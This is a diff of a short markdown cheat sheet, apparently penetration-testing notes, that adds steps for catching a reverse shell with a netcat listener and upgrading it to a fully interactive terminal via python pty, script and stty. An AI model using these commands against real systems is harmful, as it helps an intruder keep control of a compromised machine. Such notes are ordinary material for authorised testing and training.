@@ -51,15 +51,21 @@ nc -lvnp 4444 &
 ```sh
 nc -lvnp 4444
 
-# ---- Activate -------------------------
+# ---- Got shell -------------------------
 
 # Interactive shell
 /bin/bash -i
 
 # Upgrade to fully functional terminal
-$ SHELL=/bin/bash script -q /dev/null
+SHELL=/bin/bash script -q /dev/null
 # or
-$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+# Upgrade completely
+Ctrl+z
+stty raw -echo;fg
+Enter x2
+export TERM=xterm
 ```
 
 <br />
